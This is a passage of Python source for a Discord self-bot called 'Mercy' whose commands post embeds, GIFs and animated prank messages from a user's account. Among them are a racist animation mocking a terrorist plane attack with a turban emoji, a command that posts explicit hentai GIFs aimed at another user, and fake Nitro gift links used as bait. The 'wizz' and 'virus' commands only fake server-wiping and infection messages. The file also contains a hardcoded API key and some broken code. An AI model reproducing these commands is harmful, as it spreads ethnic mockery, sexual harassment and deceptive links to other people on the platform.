async def embed(ctx, *, message):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}embed {message}")
    await ctx.message.delete()
    embed = discord.Embed(description=(message), timestamp=ctx.message.created_at, color = (colour))
    await ctx.send(embed=embed)

@Mercy.command(pass_context=True, no_pm=True)
async def avatar(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}avatar {user}")
    r = ("{}".format(user.avatar_url))
    em=discord.Embed(title="Avatar URL", url=("{}".format(user.avatar_url)), color = (colour))
    em.add_field(name=f"Avatar", value=f"Avatar of {user.mention} Request for {ctx.author.mention}", inline=False)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    em.set_image(url=r)
    await ctx.send(embed=em)

@Mercy.command()
async def wizz(ctx):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.TextChannel):
        print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}wizz")
        initial = random.randrange(0, 60)
        message = await ctx.send(f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`")
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")

@Mercy.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}gif")
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])

@Mercy.command(aliases=["jerkoff", "ejaculate", "orgasm"])
async def cum(ctx):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}cum")
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')


@Mercy.command()
async def poll(ctx, *, arguments):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}poll")
    lol = await ctx.send(f"`📌 New Poll : {arguments}\nYes : ✅\nNo : ❎`")
    await lol.add_reaction('✅')
    await lol.add_reaction('❎')

@Mercy.command()
async def setprefix(ctx, prefix):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}setprefix {prefix}")
    embed = discord.Embed(title=f"{titlee}",description=f"\nYour new prefix is {prefix}", timestamp=ctx.message.created_at, color = (colour))
    embed.set_thumbnail(url=f"{foto}")
    embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    Mercy.command_prefix = str(prefix)
    def Clear():
      os.system('cls')
    Clear()
    startprint()
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def ping(ctx):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}ping")
    before = time.monotonic()
    message = await ctx.send("Pinging...")
    ping = (time.monotonic() - before) * 1000
    await message.edit(content=f"`{int(ping)} ms`")

@Mercy.command(name='8ball')
async def _ball(ctx, *, question):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}8ball {question}")
    await ctx.message.delete()
    responses = [
        'That is a resounding no',
        'It is not looking likely',
        'Too hard to tell',
        'It is quite possible',
        'That is a definite yes!',
        'Maybe',
        'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(color = (colour))
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    await ctx.send(embed=embed, delete_after=15)

@Mercy.command()
async def fuck(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}fuck {user}")
    await ctx.message.delete()
    fuck = [
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/14665910_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/6567739_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/21113430_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/20893884_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/22112363_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/22162885_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/red/badartisticgeese.webp",
        "https://bestanimegifs.com/content/_gifs/hentai/red/silkyuniquefrillneckedlizard.webp",
        "https://bestanimegifs.com/content/_gifs/hentai/sexcom/21963852_min.gif",
        "https://bestanimegifs.com/content/_gifs/hentai/red/tatteredconfuseddegu.webp"
    ]
    fuck2 = random.choice(fuck)
    em = discord.Embed(description=ctx.author.mention + f" **Fucked** " + user.mention , color = (colour))
    em.set_image(url=fuck2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def scared(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}scared")
    await ctx.message.delete()
    scared = [
    "https://i.pinimg.com/originals/11/15b/d8/1115bd8a15a0e4df6dce56155be15ee8bc6.gif",
    "https://media.tenor.com/images/e3c2bee748061515d56d7c08b2b15d333/tenor.gif",
    "https://i.pinimg.com/originals/ea/155/1f/ea1551ff587bf8272dafabe16cf258b48.gif",
    "https://media3.giphy.com/media/kT7VY5eUanako/giphy.gif",
    "https://media1.tenor.com/images/3d1e1501564da8453e060865f8f4fb7215a/tenor.gif?itemid=14152802",
    "https://i.imgur.com/dMecNcX.gif",
    "https://pa1.narvii.com/6154/82443332da8eed3f15ac233d815031651563c3f4237_hq.gif",
    "https://media1.tenor.com/images/4115860d26c424de44262e71a15a4e63/tenor.gif?itemid=51545186",
    "https://thumbs.gfycat.com/ShamefulScentedAmericancreamdraft-size_restricted.gif"
    ]
    scared2 = random.choice(scared)
    em = discord.Embed(description=f"**be scared**" , color = (colour))
    em.set_image(url=scared2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def emotion(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}emotion")
    await ctx.message.delete()
    emotion = [
        "https://pa1.narvii.com/6273/2c5b15631515a1541562dc62f2b2a734315b81fbfd15ad5_hq.gif",
        "https://i.pinimg.com/originals/77/6e/155/776e155e61515b51582ff80b00b71d11e154c.gif",
        "https://media1.tenor.com/images/37b3414f25107ea5b86153c5a315ac157b2/tenor.gif?itemid=115587515",
        "https://acegif.com/wp-content/gif/anime-hug-6.gif",
        "https://images.hive.blog/0x0/https://files.peakd.com/file/peakd-hive/ochitoalreves/IdcR2dvq-emocion.gif",
        "https://2.bp.blogspot.com/-TZG8Nn15ilXA/Vxo_s74vbjI/AAAAAAAAAEs/BF4xYtAyHEohrqiZi2O0MhamR7qjc5tUQCLcB/s1600/ic15RHbSxkrr78.gif",
        "https://i.pinimg.com/originals/4c/0f/ee/4c0fee4eb170115820705f2215837da52.gif",
        "https://pa1.narvii.com/6312/343ff7224c1660b6868841c87f0b0e07cffd363d_hq.gif",
        "https://img.wattpad.com/3cbff0c58154bda15d33d1f675e338a2ddf15ea0b6/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f776174747061642d6d6564615612d7365727661563652f53746f727154156d6167652f544d62786a6f305577627a4846673d3d2d33353431573153436342e315431536363737306163323662336265353832383030315153153533312e6761566"
    ]
    emotion2 = random.choice(emotion)
    em = discord.Embed(description=f"**emotion**" , color = (colour))
    em.set_image(url=emotion2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def shot(ctx, user: discord.User):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}shot {user}")
    await ctx.message.delete()
    shot = [
        "https://media1.tenor.com/images/e15c1514be61acb8f2033f2327605c5562/tenor.gif?itemid=81181515",
        "https://i.gifer.com/QCOQ.gif",
        "https://giffiles.alphacoders.com/183/183764.gif",
        "https://i.gifer.com/E60I.gif",
        "http://pa1.narvii.com/64151/afc1515b80b5b3c4123fd7aa7385357eb7450f1d1_00.gif",
        "https://i.imgur.com/zwgjr5A.gif",
        "https://steamuserimages-a.akamaihd.net/ugc/85154715336541476516/0C68DC152415B4158E5BF15B412DE58328AB4AA8365B/",
        "https://cutewallpaper.org/21/anime-guy-holding-gun/Anime-girl-with-gun-GIFs-Get-the-best-GIF-on-GIPHY.gif"
    ]
    shot2 = random.choice(shot)
    em = discord.Embed(description=ctx.author.mention + f" **He has shot him at** " + user.mention , color = (colour))
    em.set_image(url=shot2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def goodbye(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}goodbye")
    await ctx.message.delete()
    goodbye = [
        "https://i.imgur.com/z015mFD1.gif",
        "https://i.pinimg.com/originals/73/5a/ae/735aae6168d430d11af5b0bc3e724154.gif",
        "https://i.gifer.com/sCO.gif",
        "https://i.imgur.com/IMb15rAx.gif",
        "https://66.media.tumblr.com/0aad8a751503b81567c153c650f0d20cb2/15dcba48158d6d6bc-02/s615x1560/dd15332ad15c3700650e7150f0415167da2426d615c3b.gif",
        "https://media0.giphy.com/media/fxe8v45NNXFd4jdaNI/giphy.gif",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcQkls4QBbQc7cqHKficMk_2YRkhlmX_Xm1zXQ&usqp=CAU"
    ]
    goodbye2 = random.choice(goodbye)
    em = discord.Embed(description="**GoodBye! :D**", color = (colour))
    em.set_image(url=goodbye2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def hello(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}hello")
    await ctx.message.delete()
    hello = [
        "https://i.pinimg.com/originals/c2/e2/1a/c2e21a15d8e17c1d335166dbcbe0bd1bf.gif",
        "https://media1.tenor.com/images/3cde3e1fe715e02abdc2873155f57d8578/tenor.gif?itemid=166715443",
        "https://i.gifer.com/Q71.gif",
        "https://media1.tenor.com/images/15724247671543ed34a115f6ff2a15cbe1576/tenor.gif?itemid=141152312",
        "https://media1.tenor.com/images/ae15603eddb6e4bb1ea56cc6de7d0f6e/tenor.gif?itemid=5142315",
        "https://image.myanimelist.net/ui/5LYzTBVoS1156gvYvw3zjwBlFwbSWa-ZYTVw-6154ANEc",
        "https://media1.tenor.com/images/bb3c72152d3c2e75ba4b51ec15bb15bf3b/tenor.gif?itemid=17227125",
        "https://pa1.narvii.com/6118/15fc115face2ae087a1b15cb0547fec15523157b5a07_hq.gif",
        "https://i.pinimg.com/originals/d1/0c/3d/d10c3d215be68153235d157ae768db8c07.gif",
        "http://25.media.tumblr.com/tumblr_lvu5aunkgf1ql1r07o1_500.gif",
        "https://c.tenor.com/BiTbKTFh7uUAAAAC/anime-hi.gif",
        "https://editorani.files.wordpress.com/2018/04/kanbaru-says-hello.gif",
        "https://lazykathere.files.wordpress.com/2015/08/hello.gif"
    ]
    hello2 = random.choice(hello)
    em = discord.Embed(description="**Hello!**", color = (colour))
    em.set_image(url=hello2)
    em.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def meme(ctx):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}meme")
    meme = [
        "https://i1.wp.com/www.materiagris.es/wp-content/uploads/2018/10/memes-comunicacion.jpg?fit=700%2C330&ssl=1",
        "https://i.ytimg.com/vi/NdGd1fN-frA/maxresdefault.jpg",
        "https://imagenes.elcomercio.com/files/article_main/uploads/20115/08/215/5d67eefd2a0bd.jpeg",
        "https://www.fundeu.es/wp-content/uploads/2015/02/RecMemes.jpg",
        "http://images7.memedroid.com/images/UPLOADED737/5cf11c01554a81.jpeg",
        "https://i.pinimg.com/originals/68/df/81/68df81cf6da8d285d0815125df703155315.png",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcQDAzvG72xF0PdskK2NtUDn6Ppsu_01WycLA6xGE4CRqLnqoVi2RIzp8iojGwRrCjKmkgE&usqp=CAU",
        "https://i.ytimg.com/vi/gjahqHb1v8k/maxresdefault.jpg",
        "https://img.wattpad.com/cover/1151803432-256-k420541.jpg",
        "https://enportada.cl/wp-content/uploads/2021/02/15021515481_151587155181557763_575123506153241528820_n.jpg",
        "https://i.ytimg.com/vi/AqixvtnaUYY/hqdefault.jpg?sqp=-oaymwEjCOADEI4CSFryq4qpAxUIARUAAAAAGAElAADIQj0AgKJDeAE=&rs=AOn4CLCiG4QZ3MY11XNV60UuxRIMHs5XbA",
        "https://lh3.googleusercontent.com/proxy/dXQQGi15e5i8E4aWwg8dGrus8Y_gwG8CXBbNHSDK4Qvoo3PIsPGaxIPvZR3sUC6XS6e_A_ItoS15SCv0HEkeQ15JBizBfPr5Hee0p-toWln61mr3xkNGgnWkQWX-w",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcRd2NQz015P6sVHNBm-JpXv2OG4ymw6NHsaalg&usqp=CAU",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcSmrAMNTqpaplw3rh7ZOrHWhdgD0agg0sIojA&usqp=CAU",
        "https://www.12minutos.com/thumb/4/d/8/6/d86e87dfe4728b761b3f152adf68f6c03.jpg",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcQYIiKnJoNGmz15kfzpgmeaWimzxWTJFuG7efg&usqp=CAU",
        "https://p16-va-tiktok.ibyteimg.com/img/musically-maliva-obj/be1be1bfc15a071515f61a41bca44fe0a5~c5_720x720.jpeg",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcTjyVNpDNANDz7UCUh_GN-Kb5N0-yr15CqxOsA&usqp=CAU",
        "https://i.playboard.app/p/AATXAJxcX63Xvv05DTaiStAapusMxFsIwA0jbWFCA-J2oA/default.jpg",
        "https://pbs.twimg.com/profile_images/15831072712815815015/GXXiPcA4_150x150.jpg",
        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd15GcSCmU1yz0-p2rTTdM_4bUK15tLt15NcxZcdfsDlgMtHrZ6h_sut0OpuoCo15AI6ut6mGSuEoE&usqp=CAU",
    ]
    meme2 = random.choice(meme)
    em = discord.Embed(color = (colour))
    em.set_image(url=meme2)
    embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)

@Mercy.command()
async def blushed(ctx):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}blushed")
    meme = [
    "http://i.imgur.com/jvAzMIF.gif",
    "https://media1.tenor.com/images/4b333a215e3546eede31e64e5d215b74da/tenor.gif?itemid=154528515",
    "https://acegif.com/wp-content/gif/blushing-33.gif",
    "https://64.media.tumblr.com/155c5c8d001881c2e218a1de85e2615e1/tumblr_o0oylrTLtx1smsv7zo1_500.gifv",
    "https://i.pinimg.com/originals/10/42/5b/10425bd8382e2ec515a864b7055f158b38.gif",
    "http://pa1.narvii.com/60515/8d281b3608c735b65cf15063ba2ef815151515ec085b3_00.gif",
    "https://s-media-cache-ak0.pinimg.com/originals/fd/4f/fa/fd4ffaeff5127cd7aaab3281d1f3656b.gif",
    "https://i.imgur.com/ED6l1fW.gif?noredirect",
    "https://thumbs.gfycat.com/NeatAcrobaticAmericanwigeon-size_restricted.gif",
    "https://i.pinimg.com/originals/47/fe/a1/47fea171527f5e62dfc054146851c3fee.gif",
    "https://pa1.narvii.com/6235/e10735310a21468e0463c0801156b5f7e78e3b6a_hq.gif",
    "https://i.pinimg.com/originals/b8/5f/8c/b85f8c1517f78503d3f1503f15a24b4438e.gif",
    "https://radiood1.files.wordpress.com/2015/01/e32f2-736784_170x100-png.gif"
]
    meme2 = random.choice(meme)
    em = discord.Embed(description="**blushed**", color = (colour))
    em.set_image(url=meme2)
    embed.set_footer(text=f'Mercy {version}', icon_url=f"https://i.imgur.com/P4nYGot.png")
    await ctx.send(embed=em, delete_after=15)


@Mercy.command(aliases=["15/11", "1511", "terrorist"])
async def boom(ctx):
    await ctx.message.delete()
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}boom")
    invis = ""  # char(173)
    message = await ctx.send(f'''
{invis}:man_wearing_turban::airplane:    :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis} :man_wearing_turban::airplane:   :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}  :man_wearing_turban::airplane:  :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}   :man_wearing_turban::airplane: :office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
{invis}    :man_wearing_turban::airplane::office:           
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        :boom::boom::boom:    
        ''')

@Mercy.command()
async def shrug(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}shrug")
    await ctx.message.delete()
    shrug = r'¯\_(ツ)_/¯'
    await ctx.send(shrug)


@Mercy.command()
async def lenny(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}lenny")
    await ctx.message.delete()
    lenny = '( ͡° ͜ʖ ͡°)'
    await ctx.send(lenny)


@Mercy.command(aliases=["fliptable"])
async def tableflip(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}tableflip")
    await ctx.message.delete()
    tableflip = '(╯°□°）╯︵ ┻━┻'
    await ctx.send(tableflip)


@Mercy.command()
async def unflip(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}unflip")
    await ctx.message.delete()
    unflip = '┬─┬ ノ( ゜-゜ノ)'
    await ctx.send(unflip)

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

@Mercy.command()
async def nitro(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}nitro")
    await ctx.message.delete()
    await ctx.send(Nitro())

@Mercy.command()
async def virus(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}virus")
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
``[▓▓▓                    ] / -virus.exe Packing files.``        
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓                ] - -virus.exe Packing files..``         
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ -virus.exe Packing files..``        
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | -virus.exe Packing files..``         
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / -virus.exe Packing files..``      
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - -virus.exe Packing files..``    
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ -virus.exe Packing files..``   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``New file with name change, New file : Mercy.exe``   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``Injecting virus.   |``
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``Injecting virus..  /``
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
``Injecting virus... -``
''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
        ``Successfully Injected Mercy.exe :D``
        ''')

@Mercy.command()
async def table(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}table")
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
`(\°-°)\  ┬─┬`       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°□°)\  ┬─┬`       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(-°□°)-  ┬─┬`      
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯    ]`       
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯     ┻━┻`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯       [`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯          ┬─┬`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯                 ]`   
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯                  ┻━┻`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(╯°□°)╯                         [`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°-°)\                               ┬─┬`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°-°)\                                     ]`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°-°)\                                       ┻━┻`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°-°)\                                               [`
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
`(\°-°)\                                              ┬─┬`
''')
    await asyncio.sleep(0.50)
    await message.edit(content='''
        `XD`
        ''')


@Mercy.command()
async def horney(ctx):
    print(f" | [{asciicolor}Command{Fore.RESET}] | {Mercy.command_prefix}horney")
    await ctx.message.delete()
    invis = ""  # char(173)
    message = await ctx.send(f'''
```[▓▓▓                    ] / Uploading``` 
''')
    await asyncio.sleep(0.5)
    await message.edit(content=f'''
```[▓▓▓▓▓▓▓                ] - Uploading.```
''')
